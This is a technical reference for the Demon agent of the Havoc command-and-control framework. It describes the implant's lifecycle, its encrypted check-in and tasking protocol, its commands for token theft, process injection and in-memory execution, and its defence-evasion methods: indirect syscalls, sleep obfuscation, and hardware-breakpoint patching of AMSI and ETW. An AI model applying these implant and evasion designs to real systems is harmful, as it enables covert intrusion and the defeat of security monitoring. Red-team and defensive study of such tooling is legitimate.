# Demon Agent — Technical Reference

This document is a precise reference for the Demon agent component of Havoc. It covers the full lifecycle from payload generation through runtime operation, and is intended to make future work on Demon fast and accurate.

---

## Source Layout

```
payloads/Demon/
├── src/
│   ├── Demon.c                  # DemonMain, DemonInit, DemonMetaData, DemonRoutine — the core lifecycle
│   ├── main/
│   │   ├── MainExe.c            # WinMain → DemonMain(NULL, NULL)
│   │   ├── MainDll.c            # DllMain (DLL_PROCESS_ATTACH) + exported Start()
│   │   └── MainSvc.c            # Service dispatcher → SvcMain → DemonMain(NULL, NULL)
│   ├── core/
│   │   ├── Command.c            # CommandDispatcher + all DEMON_COMMAND_* handlers
│   │   ├── Win32.c              # LdrModulePeb, LdrFunctionAddr, LdrModuleLoad, hash helpers
│   │   ├── Syscalls.c           # SysInitialize, SysExtract, SysInvoke (indirect syscalls)
│   │   ├── Transport.c          # TransportInit, TransportSend (dispatcher to HTTP or SMB)
│   │   ├── TransportHttp.c      # WinHttp-based HTTP/HTTPS comms
│   │   ├── TransportSmb.c       # Named-pipe SMB comms + SMBGetJob
│   │   ├── Package.c            # PackageCreate*, PackageAdd*, PackageTransmit*
│   │   ├── Parser.c             # ParserNew, ParserDecrypt, ParserGet*
│   │   ├── Obf.c               # SleepObf dispatcher + SleepTime (always compiled)
│   │   ├── ObfTimer.c          # TimerObf — Ekko/Zilean (compiled when SLEEPOBF_USE_TIMER)
│   │   ├── ObfFoliage.c        # FoliageObf — APC fiber (compiled when SLEEPOBF_USE_FOLIAGE)
│   │   ├── HwBpEngine.c         # Hardware-breakpoint VEH engine for AMSI/ETW patching
│   │   ├── Token.c              # Token vault, steal, make, impersonate
│   │   ├── CoffeeLdr.c          # COFF/BOF loader + Beacon API shim
│   │   ├── Kerberos.c           # Kerberos operations via LSA
│   │   ├── JobsMgmt.c           # Background job list management
│   │   ├── Socket.c             # Socks / port-forward socket management
│   │   └── Download.c           # Chunked file-transfer state
│   ├── crypt/                   # AES-256 CTR + RC4 (SystemFunction032 wrapper)
│   ├── inject/                  # Process injection techniques (Inject.c)
│   └── asm/                     # NASM stubs — syscall trampolines + stack spoof gadgets
│       ├── Syscall.x64.asm / Syscall.x86.asm
│       └── Spoof.x64.asm
└── include/
    ├── Demon.h                  # INSTANCE struct (the entire agent state)
    ├── common/
    │   ├── Defines.h            # All H_FUNC_*, H_MODULE_*, DEMON_MAGIC_VALUE, version consts
    │   ├── Macros.h             # WIN_FUNC, C_PTR, U_PTR, B_PTR, SEC_DATA, NtGetLastError, DATA_FREE, …
    │   └── Native.h             # PEB/TEB structures, LDR types
    └── core/
        ├── Command.h            # DEMON_COMMAND_* constants, DEMON_COMMAND typedef
        ├── Package.h            # PACKAGE struct, PackageCreate/Add/Transmit declarations
        ├── Parser.h             # PARSER struct, ParserNew/Get* declarations
        ├── Transport.h          # PIPE_BUFFER_MAX, TransportInit/Send/SMBGetJob declarations
        ├── Win32.h              # WIN_FUNC macro, DIR_OR_FILE/ROOT_DIR structs, HASH_KEY
        ├── Syscalls.h           # SYS_EXTRACT macro, SYS_CONFIG struct, SSN/syscall offsets
        └── HwBpEngine.h         # HWBP_ENGINE, BP_LIST structs
```

---

## Coding Conventions

### No Unnecessary Typecasts

Demon intentionally avoids many typecasts. `WIN_FUNC(x)` expands to `__typeof__(x) * x;`, so each function pointer already carries the correct type. Do not add casts where the compiler does not require them — follow the existing style in the file being modified.

### WIN_FUNC Macro

Declared in `include/core/Win32.h`:
```c
#define WIN_FUNC(x) __typeof__(x) * x;
```
Used inside the `Win32` sub-struct of `INSTANCE`. Each field is a correctly-typed function pointer resolved at runtime.

### Pointer Convenience Macros (`Macros.h`)

```c
#define U_PTR(x)    ((UINT_PTR)(x))        // cast to unsigned integer
#define C_PTR(x)    ((LPVOID)(x))           // cast to void pointer
#define B_PTR(x)    ((PBYTE)(x))            // cast to byte pointer
#define SEC_DATA    __attribute__((section(".data")))
#define RVA(TYPE, BASE, RVA) (TYPE)((PBYTE)BASE + RVA)
#define DATA_FREE(d, l) if(d){ MemSet(d,0,l); Instance->Win32.LocalFree(d); d=NULL; }
#define NtGetLastError()   Instance->Teb->LastErrorValue
#define NtSetLastError(x)  Instance->Teb->LastErrorValue = x
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread()  ((HANDLE)(LONG_PTR)-2)
#define NtProcessHeap()    Instance->Teb->ProcessEnvironmentBlock->ProcessHeap
```

### Function-Hash API Resolution

All Win32/Nt functions are resolved by hash, never by string name at runtime. Two helpers:
- `LdrModulePeb(HASH)` — walks the PEB module list, matches by hashed module name
- `LdrFunctionAddr(ModuleBase, HASH)` — walks the module's export table, matches by hashed function name

Hash values for every function and module live in `include/common/Defines.h` (prefixed `H_FUNC_` and `H_MODULE_`). Hash algorithm seed: `HASH_KEY 5381` (djb2 variant).

### Global Instance

```c
SEC_DATA PINSTANCE Instance = { 0 };      // Demon.c — global pointer
SEC_DATA BYTE AgentConfig[] = CONFIG_BYTES;// embedded config blob
```
`INSTANCE` is stack-allocated in `DemonMain`, then `Instance` points to it. Every module accesses state through `Instance->...`.

### Debug Macros

`PRINTF(f, ...)` and `PUTS(s)` expand to nothing in release builds. They use different sinks depending on compile flags: `SEND_LOGS` sends over HTTP, `SHELLCODE` writes to console handle, otherwise `printf`.

---

## Binary Formats & Entry Points

The payload format is selected at compile time by the teamserver builder. Each format uses a different entry point file and linker flags:

| Format | Constant | Entry File | Linker flags |
|--------|----------|-----------|--------------|
| EXE | `FILETYPE_WINDOWS_EXE = 1` | `MainExe.c` | `-e WinMain` |
| Service EXE | `FILETYPE_WINDOWS_SERVICE_EXE = 2` | `MainSvc.c` | `-e WinMain -D SVC_EXE -lntdll` |
| DLL | `FILETYPE_WINDOWS_DLL = 3` | `MainDll.c` | `-shared -e DllMain` |
| Reflective DLL | `FILETYPE_WINDOWS_REFLECTIVE_DLL = 4` | `MainDll.c` | compiled with `-D SHELLCODE`, then Shellcode stub prepended |
| Raw Shellcode | `FILETYPE_WINDOWS_RAW_BINARY = 5` | `MainDll.c` | DLL compiled with `-D SHELLCODE`, prepended with `payloads/Shellcode.x64.bin` or `.x86.bin` |

**`MainExe.c`** — `WinMain` calls `DemonMain(NULL, NULL)` and returns.

**`MainDll.c`** — `DllMain` on `DLL_PROCESS_ATTACH`:
- If `SHELLCODE` defined: calls `DemonMain(hDllBase, Reserved)` inline (cannot do blocking I/O in `DllMain` without a new thread when not shellcode)
- Otherwise: resolves `CreateThread` from the PEB, creates a new thread that calls `DemonMain(hDllBase, NULL)`
- Exports `Start()` (for rundll32 compatibility) — infinite sleep loop, never calls the agent

**`MainSvc.c`** — registers `StartServiceCtrlDispatcherA`, `SvcMain` calls `DemonMain(NULL, NULL)`. Service control handler handles `SERVICE_CONTROL_STOP`/`_SHUTDOWN`.

---

## Initialization Sequence

```
DemonMain(ModuleInst, KArgs)
  │
  ├─ Instance = &Inst           // stack-allocate INSTANCE, set global pointer
  ├─ DemonInit(ModuleInst, KArgs)
  │     ├─ Instance->Teb = NtCurrentTeb()
  │     ├─ LdrModulePeb(H_MODULE_NTDLL) → resolve all ntdll Win32 pointers
  │     ├─ Detect OS version via RtlGetVersion → Instance->Session.OSVersion
  │     ├─ LdrModulePeb(H_MODULE_KERNEL32) → resolve kernel32 Win32 pointers
  │     ├─ Load remaining modules (advapi32, oleaut32, user32, iphlpapi, gdi32,
  │     │   netapi32, ws2_32, sspicli, winhttp[HTTP only])
  │     ├─ Resolve all function pointers for each module
  │     ├─ DemonConfig() — parse AgentConfig[] (CONFIG_BYTES) into Instance->Config.*
  │     ├─ Instance->Session.AgentID = RandomNumber32()
  │     ├─ If Config.Implant.SysIndirect: SysInitialize() — extract SSNs for all Nt* calls
  │     └─ If Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP: set up HwBpEngine
  │
  ├─ DemonMetaData(&Instance->MetaData, TRUE)
  │     └─ Builds DEMON_INITIALIZE (99) packet (see Wire Protocol below)
  │
  └─ DemonRoutine()             // infinite loop — never returns
        └─ for(;;):
              if !Connected → TransportInit()   // connect + send MetaData
              if  Connected → CommandDispatcher()
              SleepObf()
```

**`DemonConfig()`** reads `AgentConfig[]` with a `PARSER`, in exactly the same order that the teamserver's `PatchConfig()` writes it (see Payload Generation below).

---

## INSTANCE Struct (`include/Demon.h`)

The single global struct that holds all agent state. Key sub-sections:

```c
typedef struct {
    PPACKAGE MetaData;          // initial checkin package (sent on connect)
    UINT32   CurrentRequestID;  // last RequestID received from teamserver
    BOOL     WSAWasInitialised;

    // HTTP transport session handles (TRANSPORT_HTTP only)
    HANDLE hHttpSession;
    BOOL   LookedForProxy;
    PVOID  ProxyForUrl;
    SIZE_T SizeOfProxyForUrl;

    struct {                    // Session — runtime identity
        PVOID ModuleBase;       // own DLL/EXE base address
        DWORD ModuleSize;
        PVOID TxtBase;          // own .text section (used for sleep obf encryption)
        DWORD TxtSize;
        DWORD AgentID;          // random 32-bit ID generated at startup
        BOOL  Connected;
        DWORD PID, TID, PPID;
        WORD  OS_Arch, Process_Arch;
        DWORD OSVersion;        // WIN_VERSION_* constant
    } Session;

    struct {
        DWORD Sleeping;         // base sleep milliseconds
        DWORD Jitter;           // jitter percentage (0–100)

        struct {
            UINT64 KillDate;    // Unix timestamp; 0 = no kill date
            UINT32 WorkingHours;

            // HTTP (TRANSPORT_HTTP):
            PHOST_DATA Host;    // currently active host
            PHOST_DATA Hosts;   // linked list of all C2 hosts
            UINT32     NumHosts;
            LPWSTR     Method;  // L"POST"
            SHORT      HostRotation; // 0=round-robin, 1=random
            DWORD      HostIndex;
            DWORD      HostMaxRetries;
            DWORD      Secure;  // TRUE → HTTPS
            LPWSTR     UserAgent;
            LPWSTR*    Uris;    // array of request URI strings
            LPWSTR*    Headers; // array of custom header strings
            struct {
                BOOL   Enabled;
                LPWSTR Url, Username, Password;
            } Proxy;

            // SMB (TRANSPORT_SMB):
            LPSTR  Name;        // pipe name e.g. \\.\pipe\foo
            HANDLE Handle;
        } Transport;

        struct _CONFIG {
            ULONG SleepMaskTechnique; // SLEEPOBF_NO_OBF/EKKO/ZILEAN/FOLIAGE
            ULONG SleepJmpBypass;     // SLEEPOBF_BYPASS_NONE/JMPRAX/JMPRBX
            BOOL  StackSpoof;
            BOOL  SysIndirect;
            BYTE  ProxyLoading;       // PROXYLOAD_NONE/RTLREGISTERWAIT/RTLCREATETIMER/RTLQUEUEWORKITEM
            BYTE  AmsiEtwPatch;       // AMSIETW_PATCH_NONE/HWBP/MEMORY
            BOOL  Verbose;
            PVOID ThreadStartAddr;
            BOOL  CoffeeThreaded;
            BOOL  CoffeeVeh;
            ULONG DownloadChunkSize;
        } Implant;

        struct {
            UINT32 Alloc;       // 0=default, 1=Win32, 2=Native/Syscall
            UINT32 Execute;     // 0=default, 1=Win32, 2=Native/Syscall
        } Memory;

        struct {
            PWCHAR Spawn64;     // e.g. L"C:\\Windows\\System32\\notepad.exe"
            PWCHAR Spawn86;
        } Process;

        struct {
            DWORD Technique;    // injection technique ID
            PVOID SpoofAddr;
        } Inject;

        struct {
            PBYTE Key;          // 32 bytes, random, generated in DemonMetaData
            PBYTE IV;           // 16 bytes, random, generated in DemonMetaData
        } AES;
    } Config;

    struct { /* Win32 */ ... } Win32;      // 100+ typed function pointers
    struct { /* Syscall */ ... } Syscall;  // SSNs + SysAddress when SysIndirect
    struct { /* Modules */ ... } Modules;  // raw module base pointers

    PTEB  Teb;
    DWORD Threads;              // count of threads currently executing agent code
    PPACKAGE Packages;          // linked list of queued outbound packages
    BUFFER DownloadChunk;       // reusable buffer for file download chunks
    PDOTNET_ARGS Dotnet;        // CLR instance state for .NET inline-execute

    struct {
        PTOKEN_LIST_DATA Vault;     // stored tokens (stolen / make)
        PTOKEN_LIST_DATA Token;     // currently impersonated token
        BOOL             Impersonate;
    } Tokens;

    PPIVOT_DATA       SmbPivots;
    PJOB_DATA         Jobs;
    PDOWNLOAD_DATA    Downloads;
    PMEM_FILE         MemFiles;
    PSOCKET_DATA      Sockets;
    PCOFFEE           Coffees;
    PCOFFEE_KEY_VALUE CoffeKeyValueStore;
    PHWBP_ENGINE      HwBpEngine;
} INSTANCE, *PINSTANCE;
```

---

## Wire Protocol

### Packet Header (20 bytes, always unencrypted)

```
Offset  Size  Field
  0       4   TotalSize       — length of everything after this field
  4       4   MagicValue      — 0xDEADBEEF  (DEMON_MAGIC_VALUE)
  8       4   AgentID         — 32-bit random ID assigned at startup
 12       4   CommandID       — e.g. DEMON_INITIALIZE (99), DEMON_COMMAND_GET_JOB (1)
 16       4   RequestID       — echoed from last teamserver task; 0 on checkin
 20       …   Payload         — AES-256-CTR encrypted (except DEMON_INITIALIZE checkin body — see below)
```

`PackageCreateWithMetaData()` builds a packet with this header. `PackageCreate()` builds one without the agent header (used for sub-responses). `PackageCreateWithRequestID()` allows specifying the RequestID explicitly.

### Encryption

- Algorithm: AES-256 in CTR mode
- Key: 32 random bytes; IV: 16 random bytes — both generated once in `DemonMetaData()` and stored in `Instance->Config.AES.*`
- All packets after the initial checkin are encrypted with these keys
- The initial `DEMON_INITIALIZE` body contains the keys in plaintext (first thing sent, before encryption is established)

### Initial Checkin Packet — `DEMON_INITIALIZE` (CommandID = 99)

Body layout (written by `DemonMetaData()`):
```
[ AES Key      ]  32 bytes  (plain — establishes session encryption)
[ AES IV       ]  16 bytes  (plain)
[ AgentID      ]   4 bytes  UINT32
[ Hostname     ]   4+N      PackageAddBytes (size-prefixed)
[ Username     ]   4+N      PackageAddBytes
[ Domain       ]   4+N      PackageAddBytes
[ IP Address   ]   4+N      PackageAddString (first adapter)
[ Process Path ]   4+N      PackageAddWString (from TEB->PEB->ProcessParameters->ImagePathName)
[ PID          ]   4 bytes  DWORD  (from TEB->ClientId.UniqueProcess)
[ TID          ]   4 bytes  DWORD  (from TEB->ClientId.UniqueThread)
[ PPID         ]   4 bytes  DWORD
[ Process Arch ]   4 bytes  PROCESS_ARCH_X64 (2) or PROCESS_ARCH_X86 (1)
[ Is Admin     ]   4 bytes  BOOL (BeaconIsAdmin())
[ Module Base  ]   8 bytes  UINT64 (Instance->Session.ModuleBase)
[ OS Major     ]   4 bytes
[ OS Minor     ]   4 bytes
[ OS Product   ]   4 bytes  wProductType
[ OS SP Major  ]   4 bytes  wServicePackMajor
[ OS Build     ]   4 bytes  dwBuildNumber
[ OS Arch      ]   4 bytes  Instance->Session.OS_Arch
[ Sleep        ]   4 bytes  Instance->Config.Sleeping
[ Jitter       ]   4 bytes  Instance->Config.Jitter
[ KillDate     ]   8 bytes  UINT64
[ WorkingHours ]   4 bytes  UINT32
[ … optional  ]            e.g. pivot child info (DEMON_CHECKIN_OPTION_PIVOTS)
```

Teamserver responds with 4 bytes: the confirmed AgentID. If it matches `Instance->Session.AgentID`, `Instance->Session.Connected = TRUE`.

### Task Request / Response (per-loop)

Agent sends `DEMON_COMMAND_GET_JOB` (ID=1) which also carries all queued response packages. Teamserver replies with 0..N tasks, each:
```
[ CommandID  ]  4 bytes
[ RequestID  ]  4 bytes
[ DataLength ]  4 bytes
[ Data       ]  N bytes  (AES-256-CTR encrypted)
```
If no tasks, CommandID = `DEMON_COMMAND_NO_JOB` (10) and the loop exits to sleep.

---

## Command IDs (`include/core/Command.h`)

### Tasking commands (teamserver → agent)

```c
#define DEMON_COMMAND_GET_JOB                   1
#define DEMON_COMMAND_NO_JOB                    10
#define DEMON_COMMAND_SLEEP                     11
#define DEMON_COMMAND_PROC_LIST                 12
#define DEMON_COMMAND_FS                        15
#define DEMON_COMMAND_INLINE_EXECUTE            20   // BOF
#define DEMON_COMMAND_JOB                       21
#define DEMON_COMMAND_INJECT_DLL                22
#define DEMON_COMMAND_INJECT_SHELLCODE          24
#define DEMON_COMMAND_SPAWN_DLL                 26
#define DEMON_COMMAND_TOKEN                     40
#define DEMON_COMMAND_CHECKIN                   100
#define DEMON_COMMAND_PROC                      0x1010
#define DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE   0x2001  // .NET
#define DEMON_COMMAND_ASSEMBLY_VERSIONS         0x2003
#define DEMON_COMMAND_NET                       2100
#define DEMON_COMMAND_CONFIG                    2500
#define DEMON_COMMAND_SCREENSHOT                2510
#define DEMON_COMMAND_PIVOT                     2520
#define DEMON_COMMAND_TRANSFER                  2530
#define DEMON_COMMAND_SOCKET                    2540
#define DEMON_COMMAND_KERBEROS                  2550
#define DEMON_COMMAND_MEM_FILE                  2560
#define DEMON_PACKAGE_DROPPED                   2570
```

### Response / info codes (agent → teamserver)

```c
#define DEMON_INFO          89
#define DEMON_OUTPUT        90   // normal command output
#define DEMON_ERROR         91
#define DEMON_EXIT          92
#define DEMON_KILL_DATE     93
#define BEACON_OUTPUT       94   // BOF output via BeaconPrintf/BeaconOutput
#define DEMON_INITIALIZE    99   // initial checkin
```

### Sub-command constants

**FS** (`DEMON_COMMAND_FS`):
`_DIR=1, _DOWNLOAD=2, _UPLOAD=3, _CD=4, _REMOVE=5, _MKDIR=6, _COPY=7, _MOVE=8, _GET_PWD=9, _CAT=10`

**Token** (`DEMON_COMMAND_TOKEN`):
`_IMPERSONATE=1, _STEAL=2, _LIST=3, _PRIVSGET_OR_LIST=4, _MAKE=5, _GET_UID=6, _REVERT=7, _REMOVE=8, _CLEAR=9, _FIND_TOKENS=10`

**Proc** (`DEMON_COMMAND_PROC`):
`_MODULES=2, _GREP=3, _CREATE=4, _MEMORY=6, _KILL=7`

**Job** (`DEMON_COMMAND_JOB`):
`_LIST=1, _SUSPEND=2, _RESUME=3, _KILL_REMOVE=4, _DIED=5`

**Transfer** (`DEMON_COMMAND_TRANSFER`):
`_LIST=0, _STOP=1, _RESUME=2, _REMOVE=3`

**Pivot** (`DEMON_COMMAND_PIVOT`):
`_LIST=1, _SMB_CONNECT=10, _SMB_DISCONNECT=11, _SMB_COMMAND=12`

**Net** (`DEMON_COMMAND_NET`):
`_DOMAIN=1, _LOGONS=2, _SESSIONS=3, _COMPUTER=4, _DCLIST=5, _SHARE=6, _LOCALGROUP=7, _GROUP=8, _USER=9`

**Config** (`DEMON_COMMAND_CONFIG`):
`DEMON_CONFIG_SHOW_ALL=0`, plus individual option IDs 1–155 (see `Command.h`)

**InlineExecute** result codes:
`_EXCEPTION=1, _SYMBOL_NOT_FOUND=2, _RAN_OK=3, _COULD_NO_RUN=4`

**DotNet info codes**:
`DOTNET_INFO_PATCHED=1, _NET_VERSION=2, _ENTRYPOINT_EXECUTED=3, _FINISHED=4, _FAILED=5`

---

## Command Dispatcher

`CommandDispatcher()` in `Command.c`:
1. Calls `PackageTransmitAll()` — sends all queued `Instance->Packages` bundled with a `DEMON_COMMAND_GET_JOB` request
2. Receives the teamserver response
3. Loops through tasks: parse `CommandID` + `RequestID` + decrypt payload, dispatch via table:

```c
typedef struct {
    INT  ID;
    VOID (*Function)(PPARSER Arguments);
} DEMON_COMMAND;
```

The dispatch table (`DemonCommands[]`) maps every `DEMON_COMMAND_*` constant to its handler function. Each handler receives a `PPARSER` pointing at the decrypted task data and uses `ParserGet*()` to extract its arguments.

**Adding a new command:**
1. Add `#define DEMON_COMMAND_FOO <id>` to `Command.h`
2. Add `VOID CommandFoo(PPARSER DataArgs);` declaration to `Command.h`
3. Implement `CommandFoo` in `Command.c` using `ParserGet*()` for input, `PackageCreate()`/`PackageAdd*()`/`PackageTransmit()` for output
4. Add `{ DEMON_COMMAND_FOO, CommandFoo }` to the `DemonCommands[]` array
5. Handle the new command ID on the teamserver side (agent dispatch in `cmd/server/agent.go`)

---

## Package API (`include/core/Package.h`, `src/core/Package.c`)

```c
// Create packages
PPACKAGE PackageCreate( UINT32 CommandID );                          // no agent header
PPACKAGE PackageCreateWithMetaData( UINT32 CommandID );              // full 20-byte header
PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID );

// Add data (each call appends size + data, or just data for fixed-width types)
VOID PackageAddInt32(  PPACKAGE, UINT32  );
VOID PackageAddInt64(  PPACKAGE, UINT64  );
VOID PackageAddBool(   PPACKAGE, BOOLEAN );
VOID PackageAddPtr(    PPACKAGE, PVOID   );
VOID PackageAddBytes(  PPACKAGE, PBYTE data, SIZE_T size );  // 4-byte size prefix + data
VOID PackageAddString( PPACKAGE, PCHAR  );                   // 4-byte size prefix + chars
VOID PackageAddWString(PPACKAGE, PWCHAR );                   // 4-byte size prefix + wide chars
VOID PackageAddPad(    PPACKAGE, PCHAR data, SIZE_T size );  // raw append, no size prefix

// Transmit
BOOL PackageTransmitNow( PPACKAGE, PVOID* Response, PSIZE_T Size ); // send immediately
VOID PackageTransmit(    PPACKAGE );            // queue onto Instance->Packages linked list
BOOL PackageTransmitAll( PVOID* Resp, PSIZE_T );// send all queued + GET_JOB request

// Error helpers
VOID PackageTransmitError( UINT32 CommandID, UINT32 ErrorCode );
#define PACKAGE_ERROR_WIN32          PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
#define PACKAGE_ERROR_NTSTATUS(s)    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError(s) );
```

`PACKAGE.Destroy = TRUE` (default) causes the package to be freed after transmission. Set it to `FALSE` to reuse (as done with `MetaData`). `PACKAGE.Encrypt = TRUE` (default) means the body is AES encrypted before sending.

---

## Parser API (`include/core/Parser.h`, `src/core/Parser.c`)

Used to read incoming task data from the teamserver. Mirrors the packer format (little-endian, size-prefixed for variable fields).

```c
typedef struct {
    PCHAR  Original;    // original buffer pointer (for ParserDestroy)
    PCHAR  Buffer;      // current read position
    UINT32 Size;        // total buffer size
    UINT32 Length;      // remaining bytes
    UINT32 TaskID;      // associated RequestID (set by dispatcher)
    BOOL   Endian;      // byte order flag
} PARSER, *PPARSER;

VOID   ParserNew(     PPARSER, PBYTE buffer, UINT32 size );
VOID   ParserDecrypt( PPARSER, PBYTE Key, PBYTE IV );  // AES-256-CTR decrypt in place
BYTE   ParserGetByte(   PPARSER );
INT16  ParserGetInt16(  PPARSER );
INT    ParserGetInt32(  PPARSER );
INT64  ParserGetInt64(  PPARSER );
BOOL   ParserGetBool(   PPARSER );
PBYTE  ParserGetBytes(  PPARSER, PUINT32 size );   // reads 4-byte size then data
PCHAR  ParserGetString( PPARSER, PUINT32 size );   // reads 4-byte size then chars
PWCHAR ParserGetWString(PPARSER, PUINT32 size );   // reads 4-byte size then wide chars
VOID   ParserDestroy(   PPARSER );
```

---

## Transport Layer

### `TransportInit()` (`Transport.c`)

Sends `Instance->MetaData` (the `DEMON_INITIALIZE` packet). On success, reads the 4-byte AgentID confirmation and sets `Instance->Session.Connected = TRUE`. On failure, resets the connection state and returns `FALSE`; `DemonRoutine` will try again after a sleep.

### HTTP Transport (`TransportHttp.c`)

Uses `WinHttp*` functions stored in `Instance->Win32`. All handles kept in `Instance->hHttpSession` (persistent session).

- Request method always `POST` (GET not supported by the builder)
- URI randomly selected from `Instance->Config.Transport.Uris[]`
- Custom headers from `Instance->Config.Transport.Headers[]`
- Host selected via `HostRotation()` — round-robin (0) or random (1)
- Failed hosts tracked via `Instance->Config.Transport.Host->Failures`; marked dead after `HostMaxRetries`
- HTTPS: `WinHttpSetOption(WINHTTP_OPTION_SECURITY_FLAGS)` with `SECURITY_FLAG_IGNORE_*`
- Max request body: `DEMON_MAX_REQUEST_LENGTH = 0x300000` (3 MiB)

### SMB Transport (`TransportSmb.c`)

Uses named pipe `Instance->Config.Transport.Name`. Max message: `PIPE_BUFFER_MAX = 0x10000` (64 KiB). `SMBGetJob()` reads pending tasks from the pipe.

### Sleep & Jitter

`SleepObf()` (in `Obf.c`) dispatches based on `Instance->Config.Implant.SleepMaskTechnique`:

| Value | Constant | Behaviour | File | Compile Guard |
|-------|----------|-----------|------|---------------|
| `0` | `SLEEPOBF_NO_OBF` | `WaitForSingleObjectEx(INFINITE)` for sleep duration | `Obf.c` | Always |
| `1` | `SLEEPOBF_EKKO` | Timer-queue ROP chain: encrypt `.text` with RC4, sleep, decrypt | `ObfTimer.c` | `SLEEPOBF_USE_TIMER` |
| `2` | `SLEEPOBF_ZILEAN` | Unified with Ekko (timer queue) — originally used `RtlRegisterWait` but was unsafe | `ObfTimer.c` | `SLEEPOBF_USE_TIMER` |
| `3` | `SLEEPOBF_FOLIAGE` | APC-based fiber ROP chain: encrypt → wait on event → decrypt | `ObfFoliage.c` | `SLEEPOBF_USE_FOLIAGE` |

The builder adds `-DSLEEPOBF_USE_TIMER` or `-DSLEEPOBF_USE_FOLIAGE` based on the operator's selection. Only the chosen technique's code is compiled into the binary. The linker's `--gc-sections` further strips any unreachable functions.

Jitter: `effective_sleep = base_sleep * (100 - Jitter) / 100`

---

## Indirect Syscalls (`include/core/Syscalls.h`, `src/core/Syscalls.c`, `src/asm/Syscall.x64.asm`)

**Goal:** avoid user-mode hooks in ntdll by invoking syscall instructions directly with stolen SSNs.

**`SysInitialize(Ntdll)`** — called from `DemonInit` when `Config.Implant.SysIndirect = TRUE`:
- Finds a `syscall; ret` instruction sequence within ntdll → stores address in `Instance->Syscall.SysAddress`
- Calls `SYS_EXTRACT(NtFuncName)` for every needed NT function, which calls `SysExtract()` to fill `Instance->Syscall.NtFuncName` (a WORD SSN)

**`SysExtract(Function, ResolveHooked, &Ssn, &Addr)`**:
- On x64: looks for pattern `4C 8B D1 B8 [SSN_LO] [SSN_HI]` at `Function + SSN_OFFSET_1/2`
- If the function is hooked (pattern not found), calls `FindSsnOfHookedSyscall()` which uses neighboring syscall numbers to calculate the SSN by offset
- On x86: pattern at `SSN_OFFSET_1=1, SSN_OFFSET_2=2`

**Invocation** (`SysInvoke` / asm stub in `Syscall.x64.asm`):
- `SysSetConfig(SYS_CONFIG*)` sets the SSN and indirect address for the next call
- The asm stub places the SSN in `eax`, then calls `[SysAddress]` (the stolen `syscall` instruction inside ntdll), bypassing any inline hook

Key constants:
```c
#define SYSCALL_ASM  0x050F   // x64: "syscall" opcode
#define SYS_RANGE    0x1E     // scan range for syscall instruction
#define SYS_ASM_RET  0xC3     // ret opcode
```

---

## Hardware Breakpoint Engine (`include/core/HwBpEngine.h`, `src/core/HwBpEngine.c`)

Used for AMSI/ETW patching (`AMSIETW_PATCH_HWBP`).

```c
typedef struct _HWBP_ENGINE {
    HANDLE    Veh;          // handle from RtlAddVectoredExceptionHandler
    BYTE      First;        // first-time flag (need to set DR registers)
    PBP_LIST  Breakpoints;  // linked list
} HWBP_ENGINE;

typedef struct _BP_LIST {
    DWORD Tid;              // thread ID (0 = all threads)
    PVOID Address;          // breakpoint address (e.g. AmsiScanBuffer entry)
    PVOID Function;         // handler called when BP fires
    BYTE  Position;         // Dr0–Dr3 (0–3)
    struct _BP_LIST* Next;
} BP_LIST;

NTSTATUS HwBpEngineInit(   OUT PHWBP_ENGINE, IN PVOID ExceptionHandler );
NTSTATUS HwBpEngineAdd(    IN PHWBP_ENGINE, DWORD Tid, PVOID Addr, PVOID Function, BYTE Pos );
NTSTATUS HwBpEngineRemove( IN PHWBP_ENGINE, DWORD Tid, PVOID Addr );
NTSTATUS HwBpEngineDestroy(IN PHWBP_ENGINE );
```

Workflow:
1. `HwBpEngineInit` registers a VEH via `RtlAddVectoredExceptionHandler`
2. `HwBpEngineAdd` sets Dr0–Dr3 on the target thread via `NtGetContextThread`/`NtSetContextThread`
3. On `STATUS_SINGLE_STEP` the VEH fires, calls `BP_LIST.Function` which patches the target (e.g. writes `0xC3` ret at `AmsiScanBuffer`), then re-arms the breakpoint
4. Execution continues transparently — AMSI/ETW calls return immediately

`Instance->Win32.AmsiScanBuffer` stores the address patched by the HWBP handler.

---

## Payload Generation Pipeline (Teamserver)

**Source:** `teamserver/pkg/common/builder/builder.go`

### 1. Client triggers generation

The Qt client sends a WebSocket message to the teamserver with payload options (format, arch, sleep, injection settings, listener, etc.) as a JSON object. The teamserver calls `builder.SetConfig(json)`, `SetFormat()`, `SetArch()`, `SetListener()`, then `Build()`.

### 2. `PatchConfig()` — serializes CONFIG_BYTES

`PatchConfig()` creates a `packer.NewPacker` and appends fields in this exact order (must match `DemonConfig()` parsing order):

```
AddInt(Sleep)
AddInt(Jitter)
AddInt(ConfigAlloc)          // "Win32"=1, "Native/Syscall"=2
AddInt(ConfigExecute)        // same
AddWString(Spawn64)
AddWString(Spawn32)
AddInt(SleepObfTechnique)    // SLEEPOBF_NO_OBF/EKKO/ZILEAN/FOLIAGE
AddInt(SleepJmpBypass)       // SLEEPOBF_BYPASS_NONE/JMPRAX/JMPRBX
AddInt(StackSpoof)           // win32.TRUE/FALSE
AddInt(ProxyLoading)         // PROXYLOADING_*
AddInt(SysIndirect)          // win32.TRUE/FALSE
AddInt(AmsiPatch)            // AMSIETW_PATCH_NONE/HWBP/MEMORY

-- HTTP listener --
AddInt64(KillDate)
AddInt32(WorkingHours)
AddWString("POST")
AddInt(HostRotation)         // 0=round-robin, 1=random
AddInt(len(Hosts))
for each host: AddWString(host), AddInt(port)
AddInt(Secure)               // win32.TRUE/FALSE
AddWString(UserAgent)
AddInt(len(Headers))
for each header: AddWString(header)
AddInt(len(Uris))
for each uri: AddWString(uri)
AddInt(Proxy.Enabled)
if Proxy: AddWString(url), AddWString(user), AddWString(pass)

-- SMB listener --
AddWString("\\\\.\\pipe\\" + PipeName)
AddInt64(KillDate)
AddInt32(WorkingHours)
```

### 3. `CONFIG_BYTES` compiler define

The packed bytes are formatted as a C array literal `{0x..,0x..,...}` and passed to the compiler as `-D CONFIG_BYTES={...}`. In `Demon.c`:
```c
SEC_DATA BYTE AgentConfig[] = CONFIG_BYTES;
```

### 4. Compilation

Build directory: `/tmp/<random10>/`
Compiler: `x86_64-w64-mingw32-gcc` (x64) or `i686-w64-mingw32-gcc` (x86), paths from profile
